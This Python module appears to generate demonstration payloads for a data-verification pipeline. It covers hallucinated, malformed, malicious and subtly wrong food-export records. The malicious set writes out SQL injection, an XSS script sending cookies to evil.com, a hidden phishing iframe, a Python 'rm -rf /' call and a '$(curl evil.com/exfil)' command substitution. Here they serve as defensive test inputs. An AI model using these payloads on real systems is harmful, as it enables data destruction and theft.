"""
Behavior Simulator — Generates crafted bad payloads for interactive demonstration.

Four behavior types that test different layers of the verification pipeline:
1. Hallucinating Agent — confident but fabricated values
2. Badly Programmed Agent — garbled/malformed payloads
3. Malicious Agent — injection payloads
4. Poisoned Payload — structurally valid but subtly wrong

Each generates a payload + schema, runs through the REAL pipeline,
and returns an enhanced response with field-level attribution.
"""
import hashlib
import logging
import time
from typing import Any, Dict, List, Optional

from core.verification.models import DataSchema, FieldSpec, FieldType

logger = logging.getLogger("BehaviorSimulator")

# ---------------------------------------------------------------------------
# Simulation type metadata (returned by GET /dashboard/simulation-types)
# ---------------------------------------------------------------------------
SIMULATION_TYPES = [
    {
        "id": "hallucinating",
        "label": "Hallucinating Agent",
        "description": "Confident but fabricated values — impossible temperatures, ocean GPS, future dates, wrong arithmetic",
        "color": "purple",
        "icon": "BrainCircuit",
        "expected_verdict": "REJECTED or QUARANTINE",
    },
    {
        "id": "badly_programmed",
        "label": "Badly Programmed",
        "description": "Garbled/malformed payloads — wrong types, null required fields, invalid dates",
        "color": "amber",
        "icon": "AlertTriangle",
        "expected_verdict": "REJECTED (SchemaGatekeeper VETO)",
    },
    {
        "id": "malicious",
        "label": "Malicious Agent",
        "description": "Injection payloads — SQL injection, XSS, Python code execution attempts",
        "color": "rose",
        "icon": "ShieldAlert",
        "expected_verdict": "REJECTED (injection detection)",
    },
    {
        "id": "poisoned_payload",
        "label": "Poisoned Payload",
        "description": "Structurally valid but subtly wrong — passes schema checks, caught by deeper analysis",
        "color": "orange",
        "icon": "Bug",
        "expected_verdict": "QUARANTINE",
    },
]

VALID_BEHAVIOR_TYPES = {st["id"] for st in SIMULATION_TYPES}


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------

class BehaviorPayloadGenerator:
    """Generates crafted payloads for each behavior type."""

    def generate(self, behavior_type: str, agent_id: str) -> Dict[str, Any]:
        """
        Returns {"payload": {...}, "schema": DataSchema, "description": str}.
        """
        generators = {
            "hallucinating": self._hallucinating,
            "badly_programmed": self._badly_programmed,
            "malicious": self._malicious,
            "poisoned_payload": self._poisoned_payload,
        }
        gen = generators.get(behavior_type)
        if not gen:
            raise ValueError(f"Unknown behavior type: {behavior_type}")
        return gen(agent_id)

    def _hallucinating(self, agent_id: str) -> Dict[str, Any]:
        """Confident but fabricated values targeting ConsistencyAnalyzer + LogicTriangulation."""
        payload = {
            "product_name": "Premium Organic Manuka Honey",
            "batch_id": "BATCH-HAL-9000",
            "quantity": 500,
            "unit_price": 12.50,
            "total_price": 9999.99,  # Should be 6250.00 — off by 60%
            "temperature_celsius": -500.0,  # Below absolute zero (-273.15°C)
            "storage_location": {
                "latitude": -48.8766,  # Middle of the Southern Ocean
                "longitude": 168.0000,
            },
            "production_date": "2099-12-31",  # Far future
            "expiry_date": "2098-01-01",  # Expires BEFORE production
            "country_of_origin": "Atlantis",
            "certification_number": "CERT-000000",
            "inspector_name": "Dr. Definitely Real Person",
        }
        schema = DataSchema(
            name="food_export_batch",
            version="1.0",
            description="Food export batch data",
            fields=[
                FieldSpec(name="product_name", field_type=FieldType.STRING, required=True),
                FieldSpec(name="batch_id", field_type=FieldType.STRING, required=True),
                FieldSpec(name="quantity", field_type=FieldType.INTEGER, required=True, min_value=1),
                FieldSpec(name="unit_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="total_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="temperature_celsius", field_type=FieldType.FLOAT, required=True, min_value=-273.15, max_value=1000),
                FieldSpec(name="production_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="expiry_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="country_of_origin", field_type=FieldType.STRING, required=True),
                FieldSpec(name="certification_number", field_type=FieldType.STRING, required=True),
            ],
        )
        return {
            "payload": payload,
            "schema": schema,
            "description": "Hallucinating agent: confident but fabricated values",
        }

    def _badly_programmed(self, agent_id: str) -> Dict[str, Any]:
        """Garbled/malformed payloads targeting SchemaGatekeeper VETO."""
        payload = {
            "product_name": 12345,  # Should be string
            "batch_id": None,  # Required field is null
            "quantity": "five hundred",  # Should be int
            "unit_price": "not_a_number",  # Should be float
            "total_price": True,  # Boolean instead of float
            "temperature_celsius": "warm",  # Should be float
            "production_date": "32-13-2025",  # Invalid date
            "expiry_date": "",  # Empty required string
            "country_of_origin": 42,  # Should be string
            "storage_location": "should be a dict",  # Wrong container type
        }
        schema = DataSchema(
            name="food_export_batch",
            version="1.0",
            description="Food export batch data",
            fields=[
                FieldSpec(name="product_name", field_type=FieldType.STRING, required=True),
                FieldSpec(name="batch_id", field_type=FieldType.STRING, required=True),
                FieldSpec(name="quantity", field_type=FieldType.INTEGER, required=True, min_value=1),
                FieldSpec(name="unit_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="total_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="temperature_celsius", field_type=FieldType.FLOAT, required=True),
                FieldSpec(name="production_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="expiry_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="country_of_origin", field_type=FieldType.STRING, required=True),
                FieldSpec(name="storage_location", field_type=FieldType.DICT, required=True),
            ],
        )
        return {
            "payload": payload,
            "schema": schema,
            "description": "Badly programmed agent: garbled types and malformed data",
        }

    def _malicious(self, agent_id: str) -> Dict[str, Any]:
        """Injection payloads targeting SchemaGatekeeper injection detection."""
        payload = {
            "product_name": "'; DROP TABLE missions; --",
            "batch_id": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
            "quantity": 1,
            "unit_price": 10.00,
            "total_price": 10.00,
            "description": "__import__('os').system('rm -rf /')",
            "notes": "<iframe src='https://evil.com/phishing' style='display:none'></iframe>",
            "supplier": "Robert'); DROP TABLE agents;--",
            "country_of_origin": "<script>alert('XSS')</script>",
            "certification_number": "CERT-$(curl evil.com/exfil)",
        }
        schema = DataSchema(
            name="food_export_batch",
            version="1.0",
            description="Food export batch data",
            fields=[
                FieldSpec(name="product_name", field_type=FieldType.STRING, required=True),
                FieldSpec(name="batch_id", field_type=FieldType.STRING, required=True),
                FieldSpec(name="quantity", field_type=FieldType.INTEGER, required=True, min_value=1),
                FieldSpec(name="unit_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="total_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="description", field_type=FieldType.STRING, required=False),
                FieldSpec(name="notes", field_type=FieldType.STRING, required=False),
                FieldSpec(name="supplier", field_type=FieldType.STRING, required=False),
                FieldSpec(name="country_of_origin", field_type=FieldType.STRING, required=True),
                FieldSpec(name="certification_number", field_type=FieldType.STRING, required=True),
            ],
        )
        return {
            "payload": payload,
            "schema": schema,
            "description": "Malicious agent: SQL injection, XSS, and code execution payloads",
        }

    def _poisoned_payload(self, agent_id: str) -> Dict[str, Any]:
        """Structurally valid but subtly wrong — passes schema, caught by deeper layers."""
        payload = {
            "product_name": "Premium Organic Manuka Honey",
            "batch_id": "BATCH-NZ-2026-0442",
            "quantity": 500,
            "unit_price": 12.50,
            "total_price": 62500.00,  # Off by 10x — should be 6250.00
            "temperature_celsius": 4.2,  # Valid cold storage
            "storage_location": {
                "latitude": -36.8485,  # Auckland — valid
                "longitude": 174.7633,
            },
            "production_date": "2026-02-15",
            "expiry_date": "2027-02-15",
            "country_of_origin": "New Zealand",
            "certification_number": "MPI-FAKE-99999",  # Fake but valid format
            "organic_certified": True,
            "humidity_percent": 18.5,  # Correct range for honey
            "weight_kg": 250.0,  # 500 units × 0.5kg each = plausible
        }
        schema = DataSchema(
            name="food_export_batch",
            version="1.0",
            description="Food export batch data",
            fields=[
                FieldSpec(name="product_name", field_type=FieldType.STRING, required=True),
                FieldSpec(name="batch_id", field_type=FieldType.STRING, required=True),
                FieldSpec(name="quantity", field_type=FieldType.INTEGER, required=True, min_value=1),
                FieldSpec(name="unit_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="total_price", field_type=FieldType.FLOAT, required=True, min_value=0.01),
                FieldSpec(name="temperature_celsius", field_type=FieldType.FLOAT, required=True, min_value=-40, max_value=60),
                FieldSpec(name="production_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="expiry_date", field_type=FieldType.DATE, required=True),
                FieldSpec(name="country_of_origin", field_type=FieldType.STRING, required=True),
                FieldSpec(name="certification_number", field_type=FieldType.STRING, required=True),
                FieldSpec(name="organic_certified", field_type=FieldType.BOOLEAN, required=False),
                FieldSpec(name="humidity_percent", field_type=FieldType.FLOAT, required=False, min_value=0, max_value=100),
                FieldSpec(name="weight_kg", field_type=FieldType.FLOAT, required=False, min_value=0.01),
            ],
        )
        return {
            "payload": payload,
            "schema": schema,
            "description": "Poisoned payload: structurally valid, subtly wrong arithmetic",
        }


# ---------------------------------------------------------------------------
# Enhanced response builder
# ---------------------------------------------------------------------------

class SimulationResponseBuilder:
    """Builds field-level attribution responses from pipeline results."""

    # Error code mapping
    ERROR_CODES = {
        ("veto", "injection"): "SCHEMA_VETO_INJECTION",
        ("veto", "structural"): "SCHEMA_VETO_STRUCTURAL",
        ("veto", "triangulation"): "TRIANGULATION_VETO",
    }

    RECOMMENDATIONS = {
        "SCHEMA_VETO_INJECTION": "Sanitize input fields. Remove SQL/script/code injection patterns before submission.",
        "SCHEMA_VETO_STRUCTURAL": "Fix data types and required fields. Ensure all values match the expected schema.",
        "TRIANGULATION_VETO": "Cross-reference data with authoritative sources. Values contradict known facts.",
        "MULTI_LAYER_FAIL": "Multiple verification layers flagged issues. Review data accuracy, arithmetic, and provenance.",
        "QUARANTINE_THRESHOLD": "Data is borderline — some checks passed but inconsistencies were detected. Review flagged fields.",
    }

    def build_response(
        self,
        behavior_type: str,
        pipeline_result: Dict[str, Any],
        payload: Dict[str, Any],
        description: str,
    ) -> Dict[str, Any]:
        """Build enhanced simulation response with field-level attribution."""
        verdict = pipeline_result.get("verdict", "UNKNOWN")
        score = pipeline_result.get("score", 0.0)
        details = pipeline_result.get("details", {})
        pillar_breakdown = details.get("pillar_breakdown", {})
        veto_triggered = details.get("veto_triggered", False)
        veto_reason = details.get("veto_reason", "")

        # Derive error code
        error_code = self._derive_error_code(veto_triggered, veto_reason, score)

        # Build field issues
        field_issues = self._detect_field_issues(behavior_type, payload, veto_reason)

        # Build pipeline trace
        pipeline_trace = self._build_pipeline_trace(pillar_breakdown, veto_triggered, veto_reason)

        # Summary
        summary = self._build_summary(verdict, error_code, field_issues, veto_reason)

        # Recommendation
        recommendation = self.RECOMMENDATIONS.get(error_code, "Review all fields for accuracy and integrity.")

        return {
            "simulation": True,
            "behavior_type": behavior_type,
            "behavior_description": description,
            "verdict": verdict,
            "score": round(score, 4),
            "error_code": error_code,
            "summary": summary,
            "field_issues": field_issues,
            "recommendation": recommendation,
            "pipeline_trace": pipeline_trace,
            "proof_hash": pipeline_result.get("proof_hash", ""),
            "proof_record_id": pipeline_result.get("proof_record_id", ""),
        }

    def _derive_error_code(self, veto: bool, veto_reason: str, score: float) -> str:
        """Derive machine-readable error code from verdict details."""
        if veto:
            reason_lower = (veto_reason or "").lower()
            if any(w in reason_lower for w in ["injection", "script", "sql", "xss"]):
                return "SCHEMA_VETO_INJECTION"
            if "triangulation" in reason_lower or "logic" in reason_lower:
                return "TRIANGULATION_VETO"
            return "SCHEMA_VETO_STRUCTURAL"
        if score < 0.40:
            return "MULTI_LAYER_FAIL"
        if score < 0.70:
            return "QUARANTINE_THRESHOLD"
        return "PASS"

    def _detect_field_issues(
        self, behavior_type: str, payload: Dict[str, Any], veto_reason: str
    ) -> List[Dict[str, Any]]:
        """Detect which fields are problematic based on behavior type."""
        issues = []

        if behavior_type == "hallucinating":
            issues.extend([
                {"field": "total_price", "issue": "arithmetic_mismatch", "severity": "high",
                 "detail": f"quantity(500) × unit_price(12.50) = 6250.00, got {payload.get('total_price')}"},
                {"field": "temperature_celsius", "issue": "physically_impossible", "severity": "critical",
                 "detail": f"Value {payload.get('temperature_celsius')}°C is below absolute zero (-273.15°C)"},
                {"field": "storage_location", "issue": "gps_anomaly", "severity": "high",
                 "detail": "Coordinates point to open ocean (Southern Ocean)"},
                {"field": "production_date", "issue": "temporal_anomaly", "severity": "high",
                 "detail": f"Production date {payload.get('production_date')} is in the far future"},
                {"field": "expiry_date", "issue": "temporal_paradox", "severity": "high",
                 "detail": "Expiry date is before production date"},
                {"field": "country_of_origin", "issue": "non_existent_country", "severity": "high",
                 "detail": f"'{payload.get('country_of_origin')}' is not a recognized country"},
            ])

        elif behavior_type == "badly_programmed":
            field_checks = {
                "product_name": ("wrong_type", "critical", "Expected string, got integer"),
                "batch_id": ("null_required", "critical", "Required field is null"),
                "quantity": ("wrong_type", "critical", "Expected integer, got string"),
                "unit_price": ("wrong_type", "critical", "Expected float, got string"),
                "total_price": ("wrong_type", "critical", "Expected float, got boolean"),
                "temperature_celsius": ("wrong_type", "high", "Expected float, got string"),
                "production_date": ("invalid_format", "critical", "Invalid date format: 32-13-2025"),
                "expiry_date": ("empty_required", "critical", "Required field is empty string"),
                "country_of_origin": ("wrong_type", "high", "Expected string, got integer"),
                "storage_location": ("wrong_type", "high", "Expected dict, got string"),
            }
            for field_name, (issue, severity, detail) in field_checks.items():
                issues.append({"field": field_name, "issue": issue, "severity": severity, "detail": detail})

        elif behavior_type == "malicious":
            injection_fields = {
                "product_name": ("sql_injection", "critical", "SQL injection: DROP TABLE"),
                "batch_id": ("xss_injection", "critical", "XSS: script tag with data exfiltration"),
                "description": ("code_injection", "critical", "Python code injection: os.system()"),
                "notes": ("xss_injection", "critical", "XSS: hidden iframe injection"),
                "supplier": ("sql_injection", "critical", "SQL injection: DROP TABLE"),
                "country_of_origin": ("xss_injection", "high", "XSS: script tag"),
                "certification_number": ("command_injection", "high", "Shell command injection: $(curl ...)"),
            }
            for field_name, (issue, severity, detail) in injection_fields.items():
                issues.append({"field": field_name, "issue": issue, "severity": severity, "detail": detail})

        elif behavior_type == "poisoned_payload":
            issues.extend([
                {"field": "total_price", "issue": "arithmetic_mismatch", "severity": "high",
                 "detail": f"quantity(500) × unit_price(12.50) = 6250.00, got {payload.get('total_price')} (10x off)"},
                {"field": "certification_number", "issue": "unverifiable_certificate", "severity": "medium",
                 "detail": "Certificate number MPI-FAKE-99999 cannot be verified against authority"},
            ])

        return issues

    def _build_pipeline_trace(
        self,
        pillar_breakdown: Dict[str, Any],
        veto_triggered: bool,
        veto_reason: str,
    ) -> List[Dict[str, Any]]:
        """Build ordered pipeline trace from pillar results."""
        # Standard layer order
        layer_order = [
            "schema_gatekeeper",
            "consistency_analyzer",
            "forensic_integrity",
            "logic_triangulation",
            "attestation_verifier",
            "adversarial_challenge",
        ]

        trace = []
        for layer_name in layer_order:
            pillar_data = pillar_breakdown.get(layer_name)
            if pillar_data:
                score = pillar_data.get("score", 0.0) if isinstance(pillar_data, dict) else pillar_data
                is_veto = pillar_data.get("is_veto", False) if isinstance(pillar_data, dict) else False

                if is_veto:
                    result = "VETO"
                elif score >= 0.70:
                    result = "PASS"
                elif score >= 0.40:
                    result = "WARN"
                else:
                    result = "FAIL"

                trace.append({
                    "layer": self._format_layer_name(layer_name),
                    "layer_id": layer_name,
                    "result": result,
                    "score": round(score, 4) if isinstance(score, (int, float)) else 0.0,
                })
            else:
                # Layer was skipped (e.g., after a veto)
                trace.append({
                    "layer": self._format_layer_name(layer_name),
                    "layer_id": layer_name,
                    "result": "SKIPPED",
                    "score": None,
                })

        return trace

    def _format_layer_name(self, name: str) -> str:
        """Convert snake_case layer name to display name."""
        return name.replace("_", " ").title()

    def _build_summary(
        self, verdict: str, error_code: str, field_issues: List, veto_reason: str
    ) -> str:
        """Build human-readable summary."""
        critical_count = sum(1 for fi in field_issues if fi.get("severity") == "critical")
        high_count = sum(1 for fi in field_issues if fi.get("severity") == "high")
        total_issues = len(field_issues)

        if error_code == "SCHEMA_VETO_INJECTION":
            injection_types = set(fi["issue"] for fi in field_issues if "injection" in fi.get("issue", ""))
            return f"Payload rejected: injection attacks detected in {total_issues} fields ({', '.join(injection_types)})"
        elif error_code == "SCHEMA_VETO_STRUCTURAL":
            return f"Payload rejected: {critical_count} critical structural errors, {high_count} type mismatches"
        elif error_code == "TRIANGULATION_VETO":
            return f"Payload rejected: data contradicts known facts ({veto_reason})"
        elif error_code == "MULTI_LAYER_FAIL":
            return f"Payload rejected: {total_issues} issues detected across multiple verification layers"
        elif error_code == "QUARANTINE_THRESHOLD":
            return f"Payload quarantined: {total_issues} suspicious fields flagged for human review"
        else:
            return f"Payload {verdict.lower()}: {total_issues} fields analyzed"


# Module-level instances
payload_generator = BehaviorPayloadGenerator()
response_builder = SimulationResponseBuilder()
